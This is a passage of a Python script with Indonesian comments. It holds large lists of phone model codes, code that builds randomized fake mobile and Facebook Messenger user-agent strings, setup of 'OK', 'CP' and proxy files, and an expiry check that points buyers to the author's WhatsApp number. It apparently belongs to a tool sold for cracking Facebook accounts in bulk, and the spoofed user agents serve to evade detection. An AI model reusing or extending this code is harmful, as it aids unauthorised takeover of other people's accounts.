        "X6823C",
        "X612B",
        "X612",
        "X503",
        "X511",
        "X352",
        "X351",
        "X530",
        "X676C",
        "X6821",
        "X6823",
        "X6827",
        "X509",
        "X603",
        "X6815",
        "X620B",
        "X620",
        "X687B",
        "X6811B",
        "X6810",
        "X6811",
    ]
    mito = [
        "MITO A230",
        "Mito A67",
        "MITO A91",
        "MITO A17",
        "Mito_A35",
        "MITO T75",
        "MITO_A37_Z1",
        "MITO_A36_W1",
        "MITO A880",
        "MITO_A69",
        "MITO_A260",
    ]
    poco = [
        "22041219PG",
        "22041219PI",
        "M2010J19CG",
        "21091116AG",
        "M2102J20SG",
        "M2012K11AG",
        "M2007J20CG",
        "POCO F2 Pro",
        "2201116PG",
        "M2104K10I",
        "M2102J20SG",
        "2207117BPG",
    ]
    icherry = [
        "iCherry C251",
        "iCherry_C258",
        "iCherry C255",
        "C256",
        "iCherry C230",
        "iCherry_X1",
        "iCherry C233",
        "iCherry C229",
    ]
    samsung = [
        "SM-G361F",
        "SM-E135F",
        "SM-J700P",
        "SC-02L",
        "E025F",
        "G996B",
        "A826S",
        "E135F",
        "G781B",
        "G998B",
        "F936U1",
        "G361F",
        "A716S",
        "J327AZ",
        "E426B",
        "A015F",
        "A015M",
        "A013G",
        "A013G",
        "A013M",
        "A013F",
        "A022M",
        "A022G",
        "A022F",
        "A025M",
        "S124DL",
        "A025U",
        "A025A",
        "A025G",
        "A025F",
        "A025AZ",
        "A035F",
        "A035M",
        "A035G",
        "A032F",
        "A032M",
        "A032F",
        "A037F",
        "A037U",
        "A037M",
        "S134DL",
        "A037G",
        "A105G",
        "A105M",
        "A105F",
        "A105FN",
        "A102U",
        "S102DL",
        "A102U1",
        "A107F",
        "A107M",
        "A115AZ",
        "A115U",
        "A115U1",
        "A115A",
        "A115M",
        "A115F",
        "A125F",
        "A127F",
        "A125M",
        "A125U",
        "A127M",
        "A135F",
        "A137F",
        "A135M",
        "A136U",
        "A136U1",
        "A136W",
        "A260F",
        "A260G",
        "A260F",
        "A260G",
        "A205GN",
        "A205U",
        "A205F",
        "A205G",
        "A205FN",
        "A202F",
        "A2070",
        "A207F",
        "A207M",
        "A215U",
        "A215U1",
        "A217F",
        "A217F",
        "A217M",
        "A225F",
        "A225M",
        "A226B",
        "A226B",
        "A226BR",
        "A235F",
        "A235M",
        "A300FU",
        "A300F",
        "A300H",
        "A310F",
        "A310M",
        "A320FL",
        "A320F",
        "A305G",
        "A305GT",
        "A305N",
        "A305F",
        "A307FN",
        "A307G",
        "A307GN",
        "A315G",
        "A315F",
        "A325F",
        "A325M",
        "A326U",
        "A326W",
        "A336E",
        "A336B",
        "A430F",
        "A405FN",
        "A405FM",
        "A3051",
        "A3050",
        "A415F",
        "A426U",
        "A426B",
        "A5009",
        "A500YZ",
        "A500Y",
        "A500W",
        "A500L",
        "A500X",
        "A500XZ",
        "A510F",
        "A510Y",
        "A520F",
        "A520W",
        "A500F",
        "A500FU",
        "A500H",
        "S506DL",
        "A505G",
        "A505FN",
        "A505U",
        "A505GN",
        "A505F",
        "A507FN",
        "A5070",
        "A515F",
        "A515U",
        "A515U1",
        "A516U",
        "A516V",
        "A516N",
        "A516B",
        "A525F",
        "A525M",
        "A526U",
        "A526U1",
        "A526B",
        "A526W",
        "A528B",
        "A536B",
        "A536U",
        "A536E",
        "A536V",
        "A600FN",
        "A600G",
        "A605FN",
        "A605G",
        "A605GN",
        "A605F",
        "A6050",
        "A606Y",
        "A6060",
        "G6200",
        "A700FD",
        "A700F",
        "A7000",
        "A700H",
        "A700YD",
        "A710F",
        "A710M",
        "A720F",
        "A750F",
        "A750FN",
        "A750GN",
        "A705FN",
        "A705F",
        "A705MN",
        "A707F",
        "A715F",
        "A715W",
        "A716U",
        "A716V",
        "A716U1",
        "A716B",
        "A725F",
        "A725M",
        "A736B",
        "A530F",
        "A810YZ",
        "A810F",
        "A810S",
        "A530W",
        "A530N",
        "G885F",
        "G885Y",
        "G885S",
        "A730F",
        "A805F",
        "G887F",
        "G8870",
        "A9000",
        "A920F",
        "A920F",
        "G887N",
        "A910F",
        "G8850",
        "A908B",
        "A908N",
        "A9080",
        "G313HY",
        "G313MY",
        "G313MU",
        "G316M",
        "G316ML",
        "G316MY",
        "G313HZ",
        "G313H",
        "G313HU",
        "G313U",
        "G318H",
        "G357FZ",
        "G310HN",
        "G357FZ",
        "G850F",
        "G850M",
        "J337AZ",
        "G386T1",
        "G386T",
        "G3858",
        "G3858",
        "A226L",
        "C5000",
        "C500X",
        "C5010",
        "C5018",
        "C7000",
        "C7010",
        "C701F",
        "C7018",
        "C7100",
        "C7108",
        "C9000",
        "C900F",
        "C900Y",
        "G355H",
        "G355M",
        "G3589W",
        "G386W",
        "G386F",
        "G3518",
        "G3586V",
        "G5108Q",
        "G5108",
        "G3568V",
        "G350E",
        "G350",
        "G3509I",
        "G3508J",
        "G3502I",
        "G3502C",
        "S820L",
        "G360H",
        "G360F",
        "G360T",
        "G360M",
        "G361H",
        "E500H",
        "E500F",
        "E500M",
        "E5000",
        "E500YZ",
        "E700H",
        "E700F",
        "E7009",
        "E700M",
        "G3815",
        "G3815",
        "G3815",
        "F127G",
        "E225F",
        "E236B",
        "F415F",
        "E5260",
        "E625F",
        "F900U",
        "F907N",
        "F900F",
        "F9000",
        "F907B",
        "F900W",
        "G150NL",
        "G155S",
        "G1650",
        "W2015",
        "G7102",
        "G7105",
        "G7106",
        "G7108",
        "G7202",
        "G720N0",
        "G7200",
        "G720AX",
        "G530T1",
        "G530H",
        "G530FZ",
        "G531H",
        "G530BT",
        "G532F",
        "G531BT",
        "G531M",
        "J727AZ",
        "J100FN",
        "J100H",
        "J120FN",
        "J120H",
        "J120F",
        "J120M",
        "J111M",
        "J111F",
        "J110H",
        "J110G",
        "J110F",
        "J110M",
        "J105H",
        "J105Y",
        "J105B",
        "J106H",
        "J106F",
        "J106B",
        "J106M",
        "J200F",
        "J200M",
        "J200G",
        "J200H",
        "J200F",
        "J200GU",
        "J260M",
        "J260F",
        "J260MU",
        "J260F",
        "J260G",
        "J200BT",
        "G532G",
        "G532M",
        "G532MT",
        "J250M",
        "J250F",
        "J210F",
        "J260AZ",
        "J3109",
        "J320A",
        "J320G",
        "J320F",
        "J320H",
        "J320FN",
        "J330G",
        "J330F",
        "J330FN",
        "J337V",
        "J337P",
        "J337A",
        "J337VPP",
        "J337R4",
        "J327VPP",
        "J327V",
        "J327P",
        "J327R4",
        "S327VL",
        "S337TL",
        "S367VL",
        "J327A",
        "J327T1",
        "J327T",
        "J3110",
        "J3119S",
        "J3119",
        "S320VL",
        "J337T",
        "J400M",
        "J400F",
        "J400F",
        "J410F",
        "J410G",
        "J410F",
        "J415FN",
        "J415F",
        "J415G",
        "J415GN",
        "J415N",
        "J500FN",
        "J500M",
        "J510MN",
        "J510FN",
        "J510GN",
        "J530Y",
        "J530F",
        "J530G",
        "J530FM",
        "G570M",
        "G570F",
        "G570Y",
        "J600G",
        "J600FN",
        "J600GT",
        "J600F",
        "J610F",
        "J610G",
        "J610FN",
        "J710F",
        "J700H",
        "J700M",
        "J700F",
        "J700P",
        "J700T",
        "J710GN",
        "J700T1",
        "J727A",
        "J727R4",
        "J737T",
        "J737A",
        "J737R4",
        "J737V",
        "J737T1",
        "J737S",
        "J737P",
        "J737VPP",
        "J701F",
        "J701M",
        "J701MT",
        "S767VL",
        "S757BL",
        "J720F",
        "J720M",
        "G615F",
        "G615FU",
        "G610F",
        "G610M",
        "G610Y",
        "G611MT",
        "G611FF",
        "G611M",
        "J730G",
        "J730GM",
        "J730F",
        "J730FM",
        "S727VL",
        "S737TL",
        "J727T1",
        "J727T1",
        "J727V",
        "J727P",
        "J727VPP",
        "J727T",
        "C710F",
        "J810M",
        "J810F",
        "J810G",
        "J810Y",
        "A605K",
        "A605K",
        "A202K",
        "M336K",
        "A326K",
        "C115",
        "C115L",
        "C1158",
        "C1158",
        "C115W",
        "C115M",
        "S120VL",
        "M015G",
        "M015F",
        "M013F",
        "M017F",
        "M022G",
        "M022F",
        "M022M",
        "M025F",
        "M105G",
        "M105M",
        "M105F",
        "M107F",
        "M115F",
        "M115F",
        "M127F",
        "M127G",
        "M135M",
        "M135F",
        "M135FU",
        "M205FN",
        "M205F",
        "M205G",
        "M215F",
        "M215G",
        "M225FV",
        "M236B",
        "M236Q",
        "M305F",
        "M305M",
        "M307F",
        "M307FN",
        "M315F",
        "M317F",
        "M325FV",
        "M325F",
        "M326B",
        "M336B",
        "M336BU",
        "M405F",
        "M426B",
        "M515F",
        "M526BR",
        "M526B",
        "M536B",
        "M625F",
        "G750H",
        "G7508Q",
        "G7509",
        "N970U",
        "N970F",
        "N971N",
        "N970U1",
        "N770F",
        "N975U1",
        "N975U",
        "N975F",
        "N975F",
        "N976N",
        "N980F",
        "N981U",
        "N981B",
        "N985F",
        "N9860",
        "N986N",
        "N986U",
        "N986B",
        "N986W",
        "N9008V",
        "N9006",
        "N900A",
        "N9005",
        "N900W8",
        "N900",
        "N9009",
        "N900P",
        "N9000Q",
        "N9002",
        "9005",
        "N750L",
        "N7505",
        "N750",
        "N7502",
        "N910F",
        "N910V",
        "N910C",
        "N910U",
        "N910H",
        "N9108V",
        "N9100",
        "N915FY",
        "N9150",
        "N915T",
        "N915G",
        "N915A",
        "N915F",
        "N915S",
        "N915D",
        "N915W8",
        "N916S",
        "N916K",
        "N916L",
        "N916LSK",
        "N920L",
        "N920S",
        "N920G",
        "N920A",
        "N920C",
        "N920V",
        "N920I",
        "N920K",
        "N9208",
        "N930F",
        "N9300",
        "N930x",
        "N930P",
        "N930X",
        "N930W8",
        "N930V",
        "N930T",
        "N950U",
        "N950F",
        "N950N",
        "N960U",
        "N960F",
        "N960U",
        "N935F",
        "N935K",
        "N935S",
        "G550T",
        "G550FY",
        "G5500",
        "G5510",
        "G550T1",
        "S550TL",
        "G5520",
        "G5528",
        "G600FY",
        "G600F",
        "G6000",
        "G6100",
        "G610S",
        "G611F",
        "G611L",
        "G110M",
        "G110H",
        "G110B",
        "G910S",
        "G316HU",
        "G977N",
        "G973U1",
        "G973F",
        "G973W",
        "G973U",
        "G770U1",
        "G770F",
        "G975F",
        "G975U",
        "G970U",
        "G970U1",
        "G970F",
        "G970N",
        "G980F",
        "G981U",
        "G981N",
        "G981B",
        "G780G",
        "G780F",
        "G781W",
        "G781U",
        "G7810",
        "G9880",
        "G988B",
        "G988U",
        "G988B",
        "G988U1",
        "G985F",
        "G986U",
        "G986B",
        "G986W",
        "G986U1",
        "G991U",
        "G991B",
        "G990B",
        "G990E",
        "G990U",
        "G998U",
        "G996W",
        "G996U",
        "G996N",
        "G9960",
        "S901U",
        "S901B",
        "S908U",
        "S908U1",
        "S908B",
        "S9080",
        "S908N",
        "S908E",
        "S906U",
        "S906E",
        "S906N",
        "S906B",
        "S906U1",
        "G730V",
        "G730A",
        "G730W8",
        "C105L",
        "C101",
        "C105",
        "C105K",
        "C105S",
        "G900F",
        "G900P",
        "G900H",
        "G9006V",
        "G900M",
        "G900V",
        "G870W",
        "G890A",
        "G870A",
        "G900FD",
        "G860P",
        "G901F",
        "G901F",
        "G800F",
        "G800H",
        "G903F",
        "G903W",
        "G920F",
        "G920K",
        "G920I",
        "G920A",
        "G920P",
        "G920S",
        "G920V",
        "G920T",
        "G925F",
        "G925A",
        "G925W8",
        "G928F",
        "G928C",
        "G9280",
        "G9287",
        "G928T",
        "G928I",
        "G930A",
        "G930F",
        "G930W8",
        "G930S",
        "G930V",
        "G930P",
        "G930L",
        "G891A",
        "G935F",
        "G935T",
        "G935W8",
        "G9350",
        "G950F",
        "G950W",
        "G950U",
        "G892A",
        "G892U",
        "G8750",
        "G955F",
        "G955U",
        "G955U1",
        "G955W",
        "G955N",
        "G960U",
        "G960U1",
        "G960F",
        "G965U",
        "G965F",
        "G965U1",
        "G965N",
        "G9650",
        "J321AZ",
        "J326AZ",
        "J336AZ",
        "T116",
        "T116NU",
        "T116NY",
        "T116NQ",
        "T2519",
        "G318HZ",
        "T255S",
        "W2016",
        "W2018",
        "W2019",
        "W2021",
        "W2022",
        "G600S",
        "E426S",
        "G3812",
        "G3812B",
        "G3818",
        "G388F",
        "G389F",
        "G390F",
        "G398FN",
        "SM-A705FN",
        "SM-G975F",
        "SM-A107F",
        "SM-A336E",
        "SM-F711B",
        "SM-G6200",
        "SM-G361F",
        "SM-E426B",
        "SM-A826S",
        "SM-E426B",
    ]
    gt = [
        "GT-1015",
        "GT-1020",
        "GT-1030",
        "GT-1035",
        "GT-1040",
        "GT-1045",
        "GT-1050",
        "GT-1240",
        "GT-1440",
        "GT-1450",
        "GT-18190",
        "GT-18262",
        "GT-19060I",
        "GT-19082",
        "GT-19083",
        "GT-19105",
        "GT-19152",
        "GT-19192",
        "GT-19300",
        "GT-19505",
        "GT-2000",
        "GT-20000",
        "GT-200s",
        "GT-3000",
        "GT-414XOP",
        "GT-6918",
        "GT-7010",
        "GT-7020",
        "GT-7030",
        "GT-7040",
        "GT-7050",
        "GT-7100",
        "GT-7105",
        "GT-7110",
        "GT-7205",
        "GT-7210",
        "GT-7240R",
        "GT-7245",
        "GT-7303",
        "GT-7310",
        "GT-7320",
        "GT-7325",
        "GT-7326",
        "GT-7340",
        "GT-7405",
        "GT-7550 5GT-8005",
        "GT-8010",
        "GT-81",
        "GT-810",
        "GT-8105",
        "GT-8110",
        "GT-8220S",
        "GT-8410",
        "GT-9300",
        "GT-9320",
        "GT-93G",
        "GT-A7100",
        "GT-A9500",
        "GT-ANDROID",
        "GT-B2710",
        "GT-B5330",
        "GT-B5330B",
        "GT-B5330L",
        "GT-B5330ZKAINU",
        "GT-B5510",
        "GT-B5512",
        "GT-B5722",
        "GT-B7510",
        "GT-B7722",
        "GT-B7810",
        "GT-B9150",
        "GT-B9388",
        "GT-C3010",
        "GT-C3262",
        "GT-C3310R",
        "GT-C3312",
        "GT-C3312R",
        "GT-C3313T",
        "GT-C3322",
        "GT-C3322i",
        "GT-C3520",
        "GT-C3520I",
        "GT-C3592",
        "GT-C3595",
        "GT-C3782",
        "GT-C6712",
        "GT-E1282T",
        "GT-E1500",
        "GT-E2200",
        "GT-E2202",
        "GT-E2250",
        "GT-E2252",
        "GT-E2600",
        "GT-E2652W",
        "GT-E3210",
        "GT-E3309",
        "GT-E3309I",
        "GT-E3309T",
        "GT-G530H",
        "GT-g900f",
        "GT-G930F",
        "GT-H9500",
        "GT-I5508",
        "GT-I5801",
        "GT-I6410",
        "GT-I8150",
        "GT-I8160OKLTPA",
        "GT-I8160ZWLTTT",
        "GT-I8258",
        "GT-I8262D",
        "GT-I8268",
        "GT-I8505",
        "GT-I8530BAABTU",
        "GT-I8530BALCHO",
        "GT-I8530BALTTT",
        "GT-I8550E",
        "GT-i8700",
        "GT-I8750",
        "GT-I900",
        "GT-I9008L",
        "GT-i9040",
        "GT-I9080E",
        "GT-I9082C",
        "GT-I9082EWAINU",
        "GT-I9082i",
        "GT-I9100G",
        "GT-I9100LKLCHT",
        "GT-I9100M",
        "GT-I9100P",
        "GT-I9100T",
        "GT-I9105UANDBT",
        "GT-I9128E",
        "GT-I9128I",
        "GT-I9128V",
        "GT-I9158P",
        "GT-I9158V",
        "GT-I9168I",
        "GT-I9192I",
        "GT-I9195H",
        "GT-I9195L",
        "GT-I9250",
        "GT-I9303I",
        "GT-I9305N",
        "GT-I9308I",
        "GT-I9505G",
        "GT-I9505X",
        "GT-I9507V",
        "GT-I9600",
        "GT-m190",
        "GT-M5650",
        "GT-mini",
        "GT-N5000S",
        "GT-N5100",
        "GT-N5105",
        "GT-N5110",
        "GT-N5120",
        "GT-N7000B",
        "GT-N7005",
        "GT-N7100T",
        "GT-N7102",
        "GT-N7105",
        "GT-N7105T",
        "GT-N7108",
        "GT-N7108D",
        "GT-N8000",
        "GT-N8005",
        "GT-N8010",
        "GT-N8020",
        "GT-N9000",
        "GT-N9505",
        "GT-P1000CWAXSA",
        "GT-P1000M",
        "GT-P1000T",
        "GT-P1010",
        "GT-P3100B",
        "GT-P3105",
        "GT-P3108",
        "GT-P3110",
        "GT-P5100",
        "GT-P5200",
        "GT-P5210XD1",
        "GT-P5220",
        "GT-P6200",
        "GT-P6200L",
        "GT-P6201",
        "GT-P6210",
        "GT-P6211",
        "GT-P6800",
        "GT-P7100",
        "GT-P7300",
        "GT-P7300B",
        "GT-P7310",
        "GT-P7320",
        "GT-P7500D",
        "GT-P7500M",
        "GT-P7500R",
        "GT-P7500V",
        "GT-P7501",
        "GT-P7511",
        "GT-S3330",
        "GT-S3332",
        "GT-S3333",
        "GT-S3370",
        "GT-S3518",
        "GT-S3570",
        "GT-S3600i",
        "GT-S3650",
        "GT-S3653W",
        "GT-S3770K",
        "GT-S3770M",
        "GT-S3800W",
        "GT-S3802",
        "GT-S3850",
        "GT-S5220",
        "GT-S5220R",
        "GT-S5222",
        "GT-S5230",
        "GT-S5230W",
        "GT-S5233T",
        "GT-s5233w",
        "GT-S5250",
        "GT-S5253",
        "GT-s5260",
        "GT-S5280",
        "GT-S5282",
        "GT-S5283B",
        "GT-S5292",
        "GT-S5300",
        "GT-S5300L",
        "GT-S5301",
        "GT-S5301B",
        "GT-S5301L",
        "GT-S5302",
        "GT-S5302B",
        "GT-S5303",
        "GT-S5303B",
        "GT-S5310",
        "GT-S5310B",
        "GT-S5310C",
        "GT-S5310E",
        "GT-S5310G",
        "GT-S5310I",
        "GT-S5310L",
        "GT-S5310M",
        "GT-S5310N",
        "GT-S5312",
        "GT-S5312B",
        "GT-S5312C",
        "GT-S5312L",
        "GT-S5330",
        "GT-S5360",
        "GT-S5360B",
        "GT-S5360L",
        "GT-S5360T",
        "GT-S5363",
        "GT-S5367",
        "GT-S5369",
        "GT-S5380",
        "GT-S5380D",
        "GT-S5500",
        "GT-S5560",
        "GT-S5560i",
        "GT-S5570B",
        "GT-S5570I",
        "GT-S5570L",
        "GT-S5578",
        "GT-S5600",
        "GT-S5603",
        "GT-S5610",
        "GT-S5610K",
        "GT-S5611",
        "GT-S5620",
        "G-S5670",
        "GT-S5670B",
        "GT-S5670HKBZTA",
        "GT-S5690",
        "GT-S5690R",
        "GT-S5830",
        "GT-S5830D",
        "GT-S5830G",
        "GT-S5830i",
        "GT-S5830L",
        "GT-S5830M",
        "GT-S5830T",
        "GT-S5830V",
        "GT-S5831i",
        "GT-S5838",
        "GT-S5839i",
        "GT-S6010",
        "GT-S6010BBABTU",
        "GT-S6012",
        "GT-S6012B",
        "GT-S6102",
        "GT-S6102B",
        "GT-S6293T",
        "GT-S6310B",
        "GT-S6310ZWAMID",
        "GT-S6312",
        "GT-S6313T",
        "GT-S6352",
        "GT-S6500",
        "GT-S6500D",
        "GT-S6500L",
        "GT-S6790",
        "GT-S6790L",
        "GT-S6790N",
        "GT-S6792L",
        "GT-S6800",
        "GT-S6800HKAXFA",
        "GT-S6802",
        "GT-S6810",
        "GT-S6810B",
        "GT-S6810E",
        "GT-S6810L",
        "GT-S6810M",
        "GT-S6810MBASER",
        "GT-S6810P",
        "GT-S6812",
        "GT-S6812B",
        "GT-S6812C",
        "GT-S6812i",
        "GT-S6818",
        "GT-S6818V",
        "GT-S7230E",
        "GT-S7233E",
        "GT-S7250D",
        "GT-S7262",
        "GT-S7270",
        "GT-S7270L",
        "GT-S7272",
        "GT-S7272C",
        "GT-S7273T",
        "GT-S7278",
        "GT-S7278U",
        "GT-S7390",
        "GT-S7390G",
        "GT-S7390L",
        "GT-S7392",
        "GT-S7392L",
        "GT-S7500",
        "GT-S7500ABABTU",
        "GT-S7500ABADBT",
        "GT-S7500ABTTLP",
        "GT-S7500CWADBT",
        "GT-S7500L",
        "GT-S7500T",
        "GT-S7560",
        "GT-S7560M",
        "GT-S7562",
        "GT-S7562C",
        "GT-S7562i",
        "GT-S7562L",
        "GT-S7566",
        "GT-S7568",
        "GT-S7568I",
        "GT-S7572",
        "GT-S7580E",
        "GT-S7583T",
        "GT-S758X",
        "GT-S7592",
        "GT-S7710",
        "GT-S7710L",
        "GT-S7898",
        "GT-S7898I",
        "GT-S8500",
        "GT-S8530",
        "GT-S8600",
        "GT-STB919",
        "GT-T140",
        "GT-T150",
        "GT-V8a",
        "GT-V8i",
        "GT-VC818",
        "GT-VM919S",
        "GT-W131",
        "GT-W153",
        "GT-X831",
        "GT-X853",
        "GT-X870",
        "GT-X890",
        "GT-Y8750",
    ]
    iphonee = [
        "X 10_15_6",
        "X 10_8_5",
        "X 10.7",
        "X 10_6_8",
        "X 10.8",
        "X 10_8_4",
        "X 10_5_8",
        "X 10_8_3",
        "X 10.6",
        "X 10_7_5",
        "X 10_8_0",
        "X 10.5",
        "X 10_9",
        "X 10_7_2",
        "X 10_7_3",
        "X x.y",
        "X 10_5_4",
        "X Mach-O",
        "X 10.4",
        "X 10_6_1",
        "X 10_4_11",
        "X 10_11_6",
        "X 10_15_1",
        "X 10_14_3",
        "X 10.10.1",
        "X 10_12_1",
        "X 10_13_2",
        "X 10_12_5",
        "X 10_10_5",
        "X 10.2",
    ]
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvvivo = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(vivo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvmito = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(mito))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvicherry = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(icherry))}) Build/MRA58{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvpoco = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(poco))} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    strviphonee = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rc(iphonee))} like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone{str(rr(1,8))},{str(rr(1,4))};FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/glo;FBID/phone;FBLC/en_GB;FBOP/5]"
    uateddy = random.choice(
        [
            strvvivo,
            strvinfinix,
            strvmito,
            strvicherry,
            strvpoco,
            strvsamsung,
            strvgt,
            strviphonee,
        ]
    )
    ugen7.append(uateddy)
    
#----------[BUAT RUN TOOLS SCRIPT INI]----------#
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.mkdir('/sdcard/dump')
	except:pass
	#menuhah()
	login()

#----------[BUAT EXPIRED SCRIPT]----------#
expired = ['14', '02', '2024']
saat_ini = datetime.now()
tgl = saat_ini.strftime('%d')
bln = saat_ini.strftime('%m')
thn = saat_ini.strftime('%Y')
waktu_new = (tgl+"-"+bln+"-"+thn)

if __name__=="__main__":
	tanggal = thn + bln + tgl
	exp = expired[2] + expired[1] + expired[0]
	if tanggal >= exp:
		os.system("clear")
		print('\033[0m')
		cetak(nel(f"""[[red]•[white]] Script Kadaluarsa Silahkan Beli Scriptnya ke Authour Asepitgans-Xc \n[[red]•[white]] WhatsApp : +6289530656600"""))
		sys.exit()
	else:
		os.system('git pull')
		make()
